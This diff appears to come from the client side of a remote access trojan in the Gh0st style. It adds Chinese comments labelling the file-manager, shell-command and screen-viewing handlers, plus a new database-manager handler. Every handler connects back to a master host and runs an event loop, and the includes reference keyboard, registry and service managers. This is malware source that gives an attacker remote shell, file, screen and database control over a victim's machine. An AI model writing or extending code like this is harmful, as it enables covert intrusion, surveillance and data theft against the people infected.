@@ -13,6 +13,7 @@
 #include "KeyboardManager.h"
 #include "RegManager.h"
 #include "SerManager.h"
+#include "DBManager.h"
 #include "ServerStart.h"
 #include "until.h"
 #include <wininet.h>
@@ -24,6 +25,7 @@
 extern Myfunction *Gyfunction;
 extern bool g_bSignalHook;
 
+//文件管理
 DWORD WINAPI Loop_FileManager(SOCKET sRemote)
 {
 	CClientSocket	socketClient;
@@ -35,6 +37,7 @@ DWORD WINAPI Loop_FileManager(SOCKET sRemote)
 	return 0;
 }
 
+//执行命令
 DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
 {
 	CClientSocket	socketClient;
@@ -48,6 +51,7 @@ DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
 	return 0;
 }
 
+//屏幕查看
 DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
 {
 	CClientSocket	socketClient;
@@ -102,6 +106,18 @@ DWORD WINAPI Loop_SystemManager(SOCKET sRemote)   //系统管理
 		return -1;
 	
 	CSystemManager	manager(&socketClient);
+	socketClient.run_event_loop();
+
+	return 0;
+}
+
+DWORD WINAPI Loop_DataBaseManager(SOCKET sRemote)		//数据库管理
+{
+	CClientSocket	socketClient;
+	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
+		return -1;
+
+	CDBManager	 manager(&socketClient);
 	socketClient.run_event_loop();
 
 	return 0;
